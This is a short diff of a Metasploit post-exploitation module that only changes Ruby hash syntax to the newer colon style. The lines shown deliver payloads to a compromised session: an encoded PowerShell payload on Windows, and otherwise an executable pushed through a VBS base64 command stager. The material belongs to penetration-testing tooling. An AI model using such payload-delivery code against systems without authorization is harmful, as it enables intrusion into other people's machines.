@@ -109,7 +109,7 @@ class Metasploit3 < Msf::Post
     case platform
     when 'win'
       if have_powershell?
-        psh_opts = { :prepend_sleep => 1, :encode_inner_payload => true, :persist => false }
+        psh_opts = { prepend_sleep: 1, encode_inner_payload: true, persist: false }
         cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
       else
         exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
@@ -135,8 +135,8 @@ class Metasploit3 < Msf::Post
       linemax = session.exploit_datastore['LineMax'].to_i
     end
     opts = {
-      :linemax => linemax,
-      #:nodelete => true # keep temp files (for debugging)
+      linemax: linemax,
+      #nodelete: true # keep temp files (for debugging)
     }
     if session.platform =~ /win/i
       opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
